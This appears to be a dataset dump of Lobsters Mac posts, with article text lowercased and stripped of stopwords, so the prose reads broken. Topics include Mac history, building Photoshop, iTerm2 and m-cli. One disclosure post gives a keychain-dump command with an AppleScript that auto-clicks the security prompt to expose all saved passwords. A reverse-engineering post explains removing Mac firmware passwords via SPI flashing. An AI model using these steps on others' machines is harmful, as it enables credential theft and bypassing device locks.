552,Lobsters,mac,Apple macOS,What makes a Mac a Mac?,http://512pixels.net/2016/07/what-makes-a-mac-a-mac/,make mac mac,editor note thomas brand macintosh clone hackintosh none mac apple doomed power macintosh tanzania motherboard power macintosh stephen edmonds,editor note guest post written buddy thomas brand make mac mac computer made apple need run mac o mac mac hardware design sit head rest ipad iphone even newton computer made apple none mac macintosh clone powercomputing motorola umax every closet hackintosh run mac o none mac back november apple doomed hardware much better average pc apple introduced different kind computer power macintosh mac macintosh clone made apple piece junk power macintosh easily identifiable floppy disk drive located left side case southpaw power macintosh existence second two early apple computer ship metal case everything power macintosh felt cheap everything sharp around edge stamped pressed steel save money case secured screw instead using clever little latch like peer power macintosh looked much like pc hard believe designed apple california built inexpensive pc part power macintosh look much better inside used slow ide hard drive apple computer using scsi shipped cheap pc compatible atx power supply modified tanzania motherboard reference design used popular macintosh clone yes way optional mhz cyrix cpu could even run window meant upgraded power macintosh mhz cpu soldered motherboard expandability limited three pci slot one taken ethernet card ram maxed mb room single gb hard drive word slow barely matching performance mac half clock speed power macintosh ran system software mac o install system software boot macweek called strange bird probably power macintosh full quirk like fact turn without charge v pram battery ram slot support mb singlebank memory ram slot support mb power macintosh required expensive v edo memory back every apple computer worked cheaper v dimms eric schwarz machine place line apple attempt making cheap mac price tag around certainly cheap today standard fascinating sidenote could gotten vastly superior power macintosh think sum nicely photo credit stephen edmonds
553,Lobsters,mac,Apple macOS,The Long View: Building Photoshop,http://basalgangster.macgui.com/RetroMacComputing/The_Long_View/Entries/2013/3/30_Building_Photoshop.html,long view building photoshop,macpaint grady booch book post tmon wwwcomputerhistoryorg wwwcomputerhistoryorgsoftwarelicensephotoshop basalgangster macguicom,â â â february computer history museum reported received source code version photoshop adobe permission release noncommercial useâ second time recently something like happened first release quickdraw macpaint source code apple last yearâ case nice commentary grady booch software design legend trustee computer history museumâ time booch reported look code found elegant clear outstanding example write software commentary photoshop source code booch say software source code literature computer scientist deserves studied appreciated â â â writer need study writing others usually doâ computer programmer muchâ lot written programming programmer read stuff including grady booch book opportunity actually read acknowledged great work programming pastâ source photoshop indisputable software masterpieceâ make use â shall read line code file see thomas knoll made magic â maybe grady booch look code immediately understand thread genius run cantâ source code may literature computer scientist source code may tell story function story written scrambled crazy order make senseâ understand story computer program must read order execution order text filesâ photoshop macpaint mean code compiled running read need toâ see natural order executing compare say learn story macapp version â â â photoshop created macintosh computer late look little strange today programmersâ anyone see many surprised written pascalâ maybe well known year ago pascal language saw lot use even teaching programming collegeâ pascal taught much day must almost nobody notice photoshop written ordinary pascal rather object pascalâ even fewer would recognize written using apple macapp object library version photoshop released public complete set sourcesâ going build photoshop distributed file need macintosh object pascal compiler associated library appropriate version macapp class libraryâ macapp included source code release could adobe license distribute â â â would helpful apple decided release source code appropriate version macapp time photoshopâ â source macapp trade secretâ class library distributed programmer source expected compile themselvesâ version macapp question version released replaced totally rewritten version original distributed set floppy disksâ macapp version first version distributed cdromâ apple wanted programmer port program version nt include version version cd later developer distribution think probably pretty rareâ course people doubt still old copy macapp floppy disksâ didntâ started using macapp version never copy version miraculously pair macapp diskette sale ebay time photoshop code released bought realizing age might might readableâ mostly wereâ one disk contains pascal assembly source code macapp libraryâ everything else needed build test library including resource file one object file apple share source called wwdriverco mpw script called mabuild used build macapp program make filesâ also compiled mpw tool called postrez used postprocess codeâ connects menu gui element compiled resource compiler rez object code supposed evokeâ second diskette also contains classic macapp example program like drawshapes nothingâ lucky diskette bought mostly readableâ second diskette completely errorfreeâ source code diskette one unreadable file contained seven bad sectorsâ file could read contained implementation object called tteview baby text editorâ relief find photoshop use component macapp nt surprisedâ tteview used much outside apple demo limited editing text block size smallerâ â â â macapp bought complete enough compile photoshopâ happen copy interested acquiring copy file complete library worry lawyersâ license macapp â â â tried compile macapp couple example one nt use tteview make sure mpw setup working macappâ wasntâ quick look around interwebs yielded post compsysmacprogrammer apple keith rollin release macapp thanks macguicom archiving old usenet post â basically say want keep using macapp nt use mpw version pascal compiler version course trying use mpw earliest version haveâ used mpw computer since like macapp mpw distributed floppy diskettesâ still mpw diskette moment bad judgement mid reused store file seemed important time seem anymore â mpw diskette could find sale anywhereâ according usenet post could use mpw system change macapp makefiles application resource say might suffice build evoke macapp builtin debuggerâ according keith rollin macapp debugger work macapp compiled mpw tried nothing drawshapes example way nodebug version worked debug version crashedâ could build nodebug version photoshop good â nt want use old version photoshop want run macapp debuggerâ mpw version nt source level debugger first source debugger mpw sade released version think thomas knoll must created photoshop without use source level debugger one part macappâ want see way saw would need compile macapp debugging turned luckily â problem debugger fixed small change macapp source codeâ getting macapp build â â â build macapp program debug enables code writeln window name code range checking macapp debugger interface subroutine tracingâ tracing subroutine call mean macapp debugger keep track entry exit every subroutineâ trace activated debugger every subroutine call recorded writeln window similarly trace function lispâ code compiled debugger whether tracing turned macapp call couple weirdlynamed function called bp ep respectively implemented unit entry exit every subroutineâ subroutine never seen trace like one write trace information writeln window exempted bp ep using directive leaf subroutine name code traceâ directive turn tracing back next subroutineâ macapp bp ep call subroutine named measuretallyâ reason measuretally exempt traceâ nt know would happen compiled mpw pascal compiler mpw compiled infinite recursion shouldâ startup program compiled debugging would immediately hang stay hung stack would collide something vital heap probably code segment would bad crashâ easy bug track downâ soon hung crashed hit programmer switch fell tmonâ epâ ep measuretally short could step see call turnâ problem fixed exempting measuretally traceâ nt see macapp debugger could ever worked without changeâ seems everything umeasure probably ought exempted look like wasâ anyway exempting measuretally got everything working nowâ pretty short order able build macapp system using mpw get example work debugging turned onâ fun messing around macapp example programsâ thrill ready compile photoshop fixing file â â â file photoshop distribution ready useâ firstly text file contaminated windowsstyle newline charactersâ every text line window do cpm dec terminated pair character carriage return ascii linefeed ascii â printing text using teletype machine two character would first move print head left limit advance paper one lineâ made sense line terminator back day time macintosh released already vestigialâ macintosh never expected connected teletype machinesâ needed character represent newline one enough apple omitted linefeed kept carriage returnâ somebody adobe computer museum must thought would using code window operating system intended work teletype machinesâ build photoshop first thing strip extraneous linefeedsâ next necessary attend copyright blurb top resource filesâ every pascal every rez file little snippet legalese top encased curly bracket like photoshop version file aboutrâ computer history museum wwwcomputerhistoryorg material c copyright adobe system inc may distributed third party licensed noncommercial use according wwwcomputerhistoryorgsoftwarelicensephotoshop â â â curly bracket delimit comment pascal fine pascal filesâ â assembly language file curly bracket already replaced semicolon start line exactly rightâ semicolon start comment line mpw assembly many others â resource file rez language whose convention apparently unknown archivers retained curly bracket pascal commentsâ rez resembles c curly bracket mean something altogether differentâ comment line rez begin need added finally mpw make file shell script used unique lexicon special character comment line began unix shell script part done right source distributedâ mpw script mangled use backslash instead optiond escape character line continuation instance optionf indicate targetdependency makefiles replaced colon suppose used unix makefiles fixing easily done couple little mpw script â â â additional small version issue address compiling photoshop mpw photoshop code us pascal interface file called content file folded quickdrawp time release mpw remove reference several placesâ mpw version quickdrawp left definition couple constant however borrow later version quickdrawp mpw also think knoll must using particularly early version fileâ refers field colortable record transindexâ field called ctflags inside macintosh v mpw interface filesâ changed reference transindex ctflags everywhere appeared photoshop code modification macapp â â â one great thing macapp distributed source codeâ first thing build library yourselfâ great â well meant could improve wanted toâ particular case greatâ copy thomas knoll version macapp hoping used unaltered version knew nt likelyâ lot thing readily see happening photoshop implemented macapp example floating palette window tool itâ floating window like famously part macapp another wellknown difficulty macapp time lack support mouseup problem even mentioned kurt schmucker book macapp objectoriented programming macintosh â â â understand problem mouseup tracking understand macapp support mouse trackingâ mouse tracking mean code drawing redrawing something screen response movement mouseâ normally happens mouse button downâ user drawing defining selection dragging something whatever reason moving mouse around window button pressed mouse monitoring code tframe object would call command object subclass tcommand tell mouse recentlyâ command object handled mouse tracking called tracker expected subclass tcommand implement specific behavior program mousedown tracking nt expect change tframe allâ tframe would call tracker periodically user held mouse button could update needed draw stuff screen accordinglyâ user let go mouse button tracker called one last time advisement end seriesâ time supposed clean draw final state window appear userinteractionâ â â â cool system made command object nt worry got calledâ stuff happened time tapplication object intercepted user action time tracker called stayed completely invisible programmerâ side could nt easily keep tracking mouse mouseup eventâ tframe would think action would nt call tracker till mouse button pressed start new interaction say wanted let user draw mouse upâ example imagine wanted user able define polygon clicking series vertex program drag dynamic line last clicked point current mouse position user moved around mouse button upâ mouseup tracking used polygondrawing tool macdraw superpaint canvas lot drawing programsâ wanted mouseup drawing macapp application could purely command objectâ would bore deep alter normally untouched macapp code class tframe called command objectsâ day kind problem solved using multiple inheritance even better delegation never alter gut framework apple nt share class framework source code â â â turned floating palette window problem knoll coded window behavior subclassing existing macapp tview class one thing like study get everything running photoshop almost use mouseup trackingâ one small thing longtime photoshop user nt know forgotten feature learned got error compiletimeâ subclass tcommand tracker photoshop called tlassoselector override tcommand method called trackmouseup compiler knew version macapp tcommand message called trackmouseupâ thomas version must â â â lasso tool us mouseup tracking sometimesâ try version photoshop start make selection using lasso toolâ part way selection press option key release mouse buttonâ photoshop drag straight line place released mouse button current location mouseâ release option key close selection straight lineâ photoshop also knoll change macapp make happen nt copy changesâ course easy put dummy method called trackmouseup tcommand would satisfy compilerâ would never get called mouseup tracking would happen version photoshop would compile would authentic good enoughâ add call trackmouseup somewhere right spotâ would know right spot right trackmouseup lasso command object would right thingâ course also needed default donothing version trackmouseup tcommand could overridenâ pretty sure tframe object call trackmouseupâ macapp later version object class tframe provides scrolling view windowsâ also monitor click drag screen territory send message tracker command object supposed drawing spacesâ pointed grady booch commentary almost comment photoshop code hint left anywhere knollâ look trackmouseup lassoselector supposed take tframe tframe gave tracking mouseâ stuck call trackmouseup part tframetrackincontent run end tracking mouse releasedâ work ca nt sure whether change made macapp original photoshopâ similar change another part tframe also required another mystery overrideâ photoshop override tframecalcsbarmin another macapp method existâ tframecalcsbarmax tframeadjustsbars put call calcsbarmin tooâ nt actually know function ca nt even sure workingâ find later study action photoshop also expects find procedure called flashbuttonâ thought apparent wrote something accordingly eveitfo â â â photoshop expects link object file called eveitfoâ file thereâ apparently provides code function called evestatus evereset eveenable evereadgpr evechallengeâ function called global function verifyeve present called startup timeâ linking photoshop fails unresolved reference examination verifyeve show none eve function called unless photoshop resource type eve evespace â resource distribution resource description file function would never called anyway source code distribution designed link eveitfo final build call dead code adding appropriate resource would bring back life without rebuildâ think verifyeve must something serial number registration called immediately registercopy check whether valid registration number enteredâ commenting eve function program run registercopy work fine successfully accepts valid photoshop serial number reject invalid one even without verifyeveâ verifyeve remains mysteryâ personalization information including serial number correct stored program resource type reg â debug version photoshop includes av alidâ reg resource registration information allows program start fine already registeredâ show personalization thomas knoll knoll softwareâ coolâ photoshop think thomas knoll else would running debugger enabled â thing tougher â â â built photoshop stock mac iici accelerator removed cache card put back place see experience would build high end macintosh full build compiling macapp program together took minutesâ macapp already built reduced minutesâ â â â debug version photoshop start normally immediate difference release version debug menu presence writeln window labeled debug window bottom screen debug window regular window drag around resizeâ thing initially written writeln command code write immediately obvious use interactive debugger macapp selection debug menu would stop program drop interaction debug windowâ item version nt version manual look macapp source code find supposed enter debuggerâ turn answer press command option shift key timeâ point get prompt â typing get list onecharacter command doâ â â â command pretty obviously usefulâ stack crawl command print name function stack address object whose method stackâ also possible display block memory list recently run subroutine information memory allocation useful thingsâ step programâ nt source level debugger sense able examine source file inside debuggerâ one really usefulsounding command inspect show content field objectâ macapp version feature window present list every object memory inspect themâ version know address object print value stored field hexâ useful might hopeâ turning trace starting program g create storm activity debug window subroutine fire run courseâ default debug window store line text important redirect output fileâ probably useful general debugging feature â â seriously thomas knoll write debug photoshop â know sure maybe soâ programmer tougher back thenâ never used source debugger relied debugging object code using something like tmon macsbug probably lot debugging photoshop happened wayâ suspect knoll big believer macapp builtin debuggerâ think nt code itâ going use inspect command macapp needed override special method called inspect classesâ inspect would format value field added application class could inspected macapp debuggerâ nt inspect would show field immediate superclass implement itâ nowhere photoshop code single override inspectâ quite direct call writeln debugging version code report information going onâ think mean using macapp debuggerâ sure lot call writeln something working debugging photoshop removed problem solvedâ â â â one first lesson learned reading photoshop appreciation power convenience tool available coding today skill programmer made big program like without long agoâ sure lot lesson waiting book photoshop open ready read bg basalgangster macguicom
554,Lobsters,mac,Apple macOS,Update your Apple devices now to fix a terrifying security bug,http://qz.com/738214/update-your-apple-devices-now-to-fix-a-terrifying-security-bug/,update apple device fix terrifying security bug,discovered tyler bohan report finding io el capitan point according one estimate billion active device worldwide stagefright,gaping security hole apple operating system exploited default messaging web browsing email software instance hacker could grab password sending infected need phone numberthe security gap discovered tyler bohan researcher cisco talos unit cisco work security forbes first report finding hack strike heart apple mobile desktop operating system exploiting way deal importing exporting imageshere attack work hacker creates malware formatted tiff file another image format like jpg gif hacker sends target using imessage especially effective messaging app automatically render image default settingsonce infected file received malicious code executed target device giving attacker access device memory stored password victim even chance prevent attack delivered email making user visit website contains infected image using apple safari browserit get worse bohan found security hole present version io o x except latest one published july bohan shared discovery apple ahead time latest version o address vulnerability mean safe version io o x el capitan another quick fix security research firm sophos point turn imessage iphone also disable mm messaging mean limited receiving text message image file receivedthe scale vulnerability staggering according apple io device run io earlier million active io device according one estimate mean least million device running apple mobile operating system vulnerable hack even accounting mobile device running absolutely newest version io mac date apple said billion active device worldwide break figure detailthis apple security problem likened flaw android google mobile operating system called stagefright discovered last year security hole also relied texting infected image million android device exposed discovered researcher zimperium zlabs april shared finding google issued update fixing problem
555,Lobsters,mac,Apple macOS,m-cli: Swiss Army Knife for Mac OS X,https://github.com/rgcr/m-cli,mcli swiss army knife mac o x,mcli swiss army knife macos overview install uninstall use command contributing overview mcli terminal install mcli homebrew homebrew install manual install mcli uninstall mcli use mcli run display command utility available mcli run display option available command run execute option command command mcli contributing todo thanks guarinogabrielmaccli mit license,mcli swiss army knife macos overview install uninstall use command contributing overview mcli macos command line tool let interact utility application entirely terminal differs macos command line tool following way easily manage administrative task nt install party tool since nt dependency installation easy nt require intervention us macos command install install mcli using homebrew manually install homebrew install homebrew installed run brew install mcli manual install want manually install mcli run curl fssl http rawgithubusercontentcomrgcrmclimasterinstallsh sudo sh also install different path shown installdir homemcli sh curl fssl http rawgithubusercontentcomrgcrmclimasterinstallsh note need privilege uninstall uninstall mcli system run uninstall use mcli command executed using following step run mto display command utility available mcli run command display option available command run command option execute option command diagram structure shown itunes status play pause disk l list f example running itunes display option available itunes shown usage itunes status play pause next prev mute unmute vol vol vol stop quit help example itunes status show status itunes play play track itunes pause pause track itunes next play next track itunes prev play previous track itunes mute mute itunes itunes unmute unmute itunes itunes vol volume itunes vol volume itunes vol set volume level itunes stop stop track itunes quit quit itunes example running itunes play play current selected track itunes music library command mcli currently support following command help battery bluetooth dir disk display dns dock finder firewall flightmode gatekeeper hostname info itunes localhost lock ntp printer network nosleep notification restart safeboot screensaver service shutdown sleep timezone touchbar trash update user volume vpn wallpaper wifi contributing fork create feature branch git checkout b mynewfeature commit change git commit add feature push branch git push origin mynewfeature submit pull request todo add plugins improve help improve installation script thanks guarinogabrielmaccli great source inspiration mit license rogelio cedillo
556,Lobsters,mac,Apple macOS,"Apple’s Swift Playgrounds can help you learn to code, but it’s no HyperCard",http://arstechnica.com/apple/2016/07/apple-swift-playgrounds-not-hypercard/,apple swift playground help learn code hypercard,wwdc keynote hypercard legacy myst credit invention lsd trip told interviewer enlarge,apple apple obsessive secrecy even senior manager acknowledge onstage wink much announce day already predicted runup wwdc saw developer twitter wishlisting xcode ipad way write apps io device rather xcode integrated development environment ide apple make available exclusively mac one suggestion could io version playground interactive test builder apple added xcode launching new programming language swift sure enough minute wwdc keynote tim svp tim swift playground ipad new way learn code thinking tweet ready personally think way learn swift ipad need century hypercard let see later john gruber whose daring fireball blog apple bbc radio today show british politics provided glimmer hope swift playground new hypercard well turn hypercard legacy hypercard back got stuff done mac already application use still word describe except hypercard arguably hypercard mostly database form designer stateless data repository scripting rather standalone sequence command could run system like macro hypertalk script code snippet attached object triggered event modern approach significantly feel like code people tell hypercard hypertalk objectoriented others call procedural layperson seems like imperative language operating objectoriented system looked like user much daunting stilted english kind mac scientific researcher teacher game developer writer could quickly learn speak hypercard stack became popular medium creating sharing homemade software rapid application development rad tool others visual authoring environment myst breakthrough graphical adventure game originated hypercard stack stewart brand whole earth major influence tech thinker including steve converted hypercard stack first best interactive cdroms remember age interactive cdroms hypercard stack point hypercard successful hypercard enabling hypercard succeeded precisely try teach anyone programmer instead put raw capability computer hand people time become programmer befits leap imagination apple bill atkinson created hypercard credit invention lsd trip already celebrated author macpaint knew hypercard bigger going open people many thing told interviewer truly personal computer rest u macintosh succeeded extent using graphic menu consistent user interface directmanipulation metaphor complexity compared earlier commandline system made harder program atkinson admitted even ambitious user limited capability commercially available application could use canned piece power enlarge bill atkinson department store hypercard like software erector set would crystallise computing building block user could snap together implement functionality user interface mind swift playground today however apple newest attempt democratize coding present inviting experience budding developer insists code even done still get deliverable work progress swift playground definitively hypercard could matter listing image apple
557,Lobsters,mac,Apple macOS,Security Flaw in OS X displays all keychain passwords in plain text,https://medium.com/@brentonhenry/security-flaw-in-os-x-displays-all-keychain-passwords-in-plain-text-a530b246e960,security flaw o x display keychain password plain text,security flaw o x display keychain password plain text method o x allow user export keychain without sudo privilege system dialog text file username password displayed plain text edit since blew overnight want address comment concern continue come,security flaw o x display keychain password plain textthis afternoon friend learned hard way let unofficial company take control computer provide support however learned shocked mostthere method o x allow user export keychain without sudo privilege system dialog text file username password displayed plain text writing method work least presumably least iteration betweenthe method consists opening terminal cutting pasting following code security dumpkeychain loginkeychain keychaintxtyou circumvent system dialog scripting terminal command adding following tell application system event repeat exists process name securityagent tell process securityagent click button allow group window end tell delay end repeatend tellany unauthorized user wether remote session like friend someone let borrow computer second gain access every username password ever stored keychain inherently icloudapple pride security apparently known method least two year since article used confirm method posted major security flaw step requires user confirm password keychain dialogue requires password request show password particular entryshouldn terminal command require level security edit since blew overnight want address comment concern continue come seems disagreement prompt password largely seems keychain locked process requires authentication practical consumer level largely defeat purpose keychain break always connected proccesses locked mine greeted nightmare amount keychain prompt mileage probably varies based much store keychainthe argument require sudo priviledge valid want admin able grab user keychain however maintenance computer logged account regardless still conflict therei find argument allowing someone use computer giving permission intellectually dishonest impractical lot situation may let someone use system inside account friend admin could login slew service still greeted hashed password webfields damage limited number website could navigate ideal world send guest account multiple situation would want grant access desktopbeing able dump entire keychain matter second security flaw core solution arguing thats designed work different great designed differently get argument view engineering design issue whose core function rethought
558,Lobsters,mac,Apple macOS,iTerm2 Version 3 Released,https://www.iterm2.com/version3.html,version released,version python scripting see documentation detail status bar theme get download latest version version released need know get download major new feature fresh look shell integration shell integration command history recent directory automatic profile switching shell integration session restoration inline image imgcat inline image badge learn badge password manager undo close tab bar left dynamic profile dynamic profile cursor location assistance timestamps captured output learn captured output small thing applescript backwards compatible new applescript syntax described alfred support alfred script perhaps crude illustration help,version version stable build meaning known major bug bunch new feature document list highlight python scripting new python scripting api allows automate customize many part see documentation detail status bar status bar customizable come thirteen different builtin component also make python theme new minimal theme reduces visual clutter compact theme save space combining title bar tab bar get download latest version version released version stable build meaning known major bug need know dozen new feature many bug fixed performance significantly improved look feel updated applescript support updated backwards compatible get download major new feature lot new feature represents eighteen month development highlight fresh look updated modern macos flat look stunningly beautiful shell integration shell integration modification shell login script informs command running host logged user name current directory enables kind cool feature easily navigating preceding shell prompt getting notification longrunning job finish dragdropping file upload download remote host much detail shell integration document command history shell integration installed record command used see list toolbelt easily navigate history rerun even see directory ran command recent directory shell integration installed record directory use often see list toolbelt ordered combination frequency recency use automatic profile switching change profile example affecting color terminal ssh remote host run sudo even depending current directory automatic profile switching part shell integration session restoration session restoration allows job keep running upgrade forcequit crash like tmux without tmux inline image using imgcat script display image file right terminal even animated gifs see inline image document detail badge version introduces concept badge badge userdefined text go topright terminal behind content display information like current host name git branch learn badge password manager builtin password manager save remember lot password us macos keychain securely store builtin guard prevent accidentally transmitted password prompt even write trigger automatically open password manager password prompt undo close undo closing session tab window close session accident get five second hit cmdz undo tab bar left lot tab put tab bar left quickly search recent command directory current host name profile name open quickly feature dynamic profile dynamic profile allow store profile json file really handy lot profile want autogenerate see dynamic profile document detail cursor location assistance never lose cursor optional cursor guide highlight entire row cursor cursor boost dims color cursor make really stand timestamps track lastmodified time line history see long command took run error message printed captured output use ide define regular expression match line text like error message compiler matching line shown toolbelt side terminal click jump line doubleclick run coprocess open file favorite editor right line number need learn captured output small thing performance greatly improved parsing incoming byte main thread hundred bug fixed lot detail improved example print binary file console offered option silence bell edit string paste get warned pasting tab shell prompt much applescript backwards compatible good news applescript make lot sense used manipulate split pane scripting receive love support future bad news existing applescript wo nt work good news pretty easy fix new applescript syntax described many thirdparty program already updated please ensure latest version program integrates alfred support although applescript changed still get alfred work go alfred preference choose feature pick terminalshell application choose custom paste alfred script text field perhaps crude illustration help
559,Lobsters,mac,Apple macOS,Twitter app prevents screen locking,https://www.jwz.org/blog/2016/06/twitter-prevents-screen-locking/,twitter app prevents screen locking,playing hdmi audio itunes fucking thing,hidden twitter window decides load invisibly autoplay video screen never autolock proof pmset g assertion grep preventuseridledisplaysleep preventuseridledisplaysleep pid twitter preventuseridledisplaysleep named comappleavkitdisableuseridledisplaysleep least idiotic slowclap good company since playing hdmi audio itunes fucking thing
560,Lobsters,mac,Apple macOS,Apple EFI firmware passwords and the SCBO myth,https://reverse.put.as/2016/06/25/apple-efi-firmware-passwords-and-the-scbo-myth/,apple efi firmware password scbo myth,scbo video universal scbo scbo file key generator scbooriginalzip scbo byte scbo file generated shift control option command firmware password utility efi nvram firmware update repository uefitool nvram macbook pro bgrep scbo unicode bit guid procedure use scbo file cp desktopscbo volumesfirmwarescbo cp desktopscbo volumesfirmwarescbo idaefiutils efiswissknife start setwatchdogtimer locateprotocol locateprotocol efi nvram firmware password utility fwappcmd resetsystem start createevent notifyfunction readscbofilecontents efisimplefilesystemprotocolguid source efisimplefilesystemprotocol openvolume openvolume efifileprotocol efifileprotocol scbo getinfo efifileprotocol firmware password utility message autentication code mac using variable number round iokit main main bootservices runtimeservices main zeroefivariable datasize size zero cause variable deleted unicorn engine efi dxe emulator bit rsa signature possibility building scbo key generator five different bit public key thunderstrike chipsec applehwaccesskext directhwkext scbo feature design robust p geekable update emulator package blog entry update update bothered read start end would understand way outsider generate code reset mac firmware please stop sending email comment asking,original goal started poking around efi implementation find way reset firmware password preliminary research found reference scbo file could loaded onto usb flash drive booted remove password normal process workflow first contact apple support since original sale receipt specific mac assume option possible since anyone stolen mac could get password reset thing got interesting found website allegedly sold scbo file send necessary hash later pay get working scbo file return video portuguese watch whole process people claiming work even claim universal scbo unlocks multiple mac since stil hold true virtually information scbo content aroused curiosity never followed upon return singapore needed new research direction kickstart brain back work fit bill core question wanted answer really possible someone build scbo file key generator true would imply efi contains significant vulnerability understanding scbo file work first place also intriguing start another efi reversing engineering time could find single scbo file internet bad impossible visualise difference file better file sample file downloaded scbooriginalzip scbooriginal picture show u full content sample file scbo string clearly visible first four byte magic number couple byte later see another string appears kind serial number information verified part string found motherboard mac sample composed macbooks guess imacs others contain information rest string binary data follows unknown total file length byte scbo file generated previously mentioned apple support able generate file provide key information obtain necessary information must hold shift control option command firmware password prompt screen string generated string apple support need string see inside scbo file first digit machine serial number previously described last sixteen digit nonce value regenerated every time firmware password set removed modified know already reversed firmware password utility observed communication kernel extension set efi nvram variable know bit content sample scbo modified reused reset firmware password answer set firmware password test mac generate necessary string modify scbo accordingly nothing happen computer process file reset system password reset provides u another bit information kind integrity check scbo content would surprise kind check implemented anyone could modify scbo content true someone selling appear fully working scbo file need dig deeper reverse efi code responsible processing file start real reverse engineering fun first thing need extract efi binary either flash chip dump hold efi content scap file found efi update unknown reason fd format also used mac maintain uptodate apple firmware update repository use easily download efi update verify content efi flash fear nation state attacking great uefitool easily extract content dump scap mass extract file use uefiextract utility instead need newengine branch want support nvram partition content super useful feature thanks nikolaj target mac used post macbook pro file extracted firmware update file use firmware file guids still address content might differ payload extracted finally try find start reversing initial best clue magic value scbo file since checked somewhere code favorite tool type task bgrep aka binary grep allows u grep file specific byte sequence extremely useful feature locate binary data byte want grep scbo magic value want grep string please remember string efi binary unicode two byte wide single hit dxe phase binary guid u efi world filename everything referenced bit guid time load binary disassembler try understand happening observe magic byte tested following piece code mean good entrypoint problem need reverse backwards understand function trying accomplish called procedure use scbo file assist reversing engineering effort important collect much data possible target work following describes use scbo file reset firmware password format flash drive guid partition scheme mac o extended format name firmware note really need firmware drag binary file named desktop open terminal execute command terminal cp desktopscbo volumesfirmwarescbo get new line error execute command terminal cp desktopscbo volumesfirmwarescbo get new line error eject flash drive turn computer insert flash drive computer turn computer pressing holding option key see lock symbol moment computer restart startup manager give u important clue looking code access filesystem read one two file look string current disassembled binary see right track scbo filename copied flash drive referenced string althought ida unable find string reference ida bug probably reversing u efi binary quite annoying every external function function pointer disassembly output clear need assistance improve snare created idaefiutils set script improve disassembly output trying rename function pointer offset structure wanted couple feature provides python fan ended creating ida c plugin task called efiswissknife extra thing like commenting known function prototype documentation generate statistic extract information installed used protocol database make easy find binary installing using certain protocol avoiding ton binary wasted time finding module implement protocol next picture show start function ida disassembles without plugin help see result running efiswissknife case able identify two u efi boot service called setwatchdogtimer locateprotocol also comment guid used locateprotocol statistic feature give u information guids able locate binary u efi runtime boot service used useful information quick idea binary improved disassembly output proceed try understand happens scbo file reverse engineering art le science start telling happens walk happens happens event notification installed efi binary usb flash drive inserted trigger notification callback executed one callback task try read scbo file flash drive verify format correct checking magic number etc scbo content appear correct new efi nvram variable set using guid guid also found firmware password utility guid unique variable used variable eg fwappcmd variable observed nvram new password set changed removed firmware password utility variable set succcessfully system reset via resetsystem service event notification code found start following code snippet responsible creating event interesting thing code third parameter createevent service notifyfunction callback get executed event trigger code follows merely register event case file system related event start looking callback code first interesting detail try locate new protocol guid protocol installed efi binary guid code continues finally reach interesting code snippet handle reading scbo file content renamed original function readscbofilecontents inside function observe certain file operation code responsible opening usb flash drive volume read content particular case need check layout efisimplefilesystemprotocolguid protocol understand function pointer protocol usually grep source find protocol even specification advanced efi fork amibios source leak also good place search particular code outside power management following snippet show efisimplefilesystemprotocol structure protocol contains single function openvolume interesting read description understand happen executes successfully openvolume function open root directory volume usb flash drive case return efifileprotocol handle need look another protocol understand feature reversing u efi constantly source find information many kind protocol function man page save u observe efifileprotocol support basic function need read write file filesystem staggering amount protocol bit annoying reverser start appreciating elegant part u design previously posted disassembly snippet first try open root volume succeeds us returned handle try open scbo file usb flash drive volume manages open file us getinfo function efifileprotocol find file size allocate necessary memory finally read content allocated buffer file read two step first byte size scbo header header content appear correct remaining read observe code snippet first byte read verification header structure scbo file support multiple unit data meaning single usb flash drive could potentially reset password one mac may pretty useful system administrator reset many mac could explain rumored reset scbo could file multiple unit pure speculation since file public rest function reset file position back beginning read whole scbo content previously allocated memory buffer scbo content read successfully next step call function another protocol verify serial number current nonce match content scbo file remember nonce rotated every time firmware password modified serial nonce confirmed correct new variable named set efi nvram area system reset unit process scbo file new variable contains scbo data minus byte header byte total length understand bit scbo feature work scbo file content match current mac new variable set computer rebooted operation mean another efi binary reading processing new variable current binary responsible reading scbo file basic integrity verification capability remove firmware password feature reserved binary variable seen following firmware dump look body size variable byte expected value end reversing process regarding binary know move really interesting binary starting reverse new binary first understand firmware password feature implemented two year ago reversed firmware password utility built small efi password bruteforcer based work work helped determine efi variable contains firmware password information password stored message autentication code mac using variable number round bruteforcing firmware password useless password longer four digit since high number round make impossible within reasonable time frame following structure describe variable content given structure bruteforce utility need retrieve information via iokit start bruteforcing password match current hash take couple minute four digit password take quick look main function new efi binary want reverse main function pretty simple first usual storage bootservices runtimeservices table pointer local variable call function last installation protocol called first efi binary reversed installed protocol composed seven function pointer function called first binary offset interesting verify efi binary calling protocol easy efiswissknife database first column contains guid efi binary using protocol binary involved efi firmware password verification binary installs another protocol called binary probably binary deal user input screen drawing unable pinpoint try patch function always return zero pack firmware dump reflash firmware password accepted mean right track rewriting story initially starting reverse everything use infinite loop trick function protocol finding interesting one patched return zero found function verifies password first one protocol protocol function retrieve variable generate hash userinserted password compare information variable constant found binary spi flasher want remove apple efi firmware password need dump flash content remove variable need flip single bit name example reflash modified firmware locate variable erase modify directly without reflashing whole content also another way variable special remove nvram reset default state firmware password set anymore go need search web forum buy overpriced efi password reset hardware need spi flasher soic clip look remaining function protocol nothing related scbo except one called binary verifies scbo serial nonce match current mac picture offset mean variable processed somewhere else answer function called main picture function process variable reset nvram case problem variable mentioned beginning function variable retrieved nvram exist code flow redirected address code start address screenshot deletes couple variable including first one cleared creates mac get stuck loop doom labelled function zeroefivariable delete variable setting datasize parameter zero u efi documentation size zero cause variable deleted next problem track code process scbo variable static analysis always easy u efi binary limited way test hypothesis reflash take around min want patch code see happens also easy access debugger jtag debugger u efi expensive cost usd already reversed many part large function function call still trouble finding code process scbo variable content want really reverse everything andor keep using slow patch reflash method idea creating efi emulator debugger using unicorn engine framework feeling extremely hard time consuming efi environment self contained example linkers syscalls emulate also knew binary le isolated using boot runtime service external protocol since total number boot runtime service small meant lot code emulated couple day work efi dxe emulator born surprise finally able run debug efi binary userland speeding reverse engineering process immensely quickly providing insight previously tricky code gave gdbinitstyle ux emulated basic command add breakpoints step step call dump memory set memory register making basic extremely useful efi debugger limitation change directly rip eflags register due unicornqemu jit design definitely usable basic task emulated core boot runtime service get set variable nvram area allocatecopyset memory load additional image installlocate new protocol far feature emulation complete pretty useful tool critical development future u efi project backwards start conclusion finished reversing function finally understood scbo feature first scbo file structure described following data structure unknown binary data initially saw nothing bit rsa signature unless someone got hold private key possibility building scbo key generator happening video people claiming able buy scbo file website bet guy somehow able submit illegitimate request support system sell scbo file receive nice fat profit could insider working apple support center even apple apple real chance investigate track source file another alternative vulnerability yet able find code design appear solid saw obvious vulnerability verify hypothesis outside efi code adapted code previously used verify 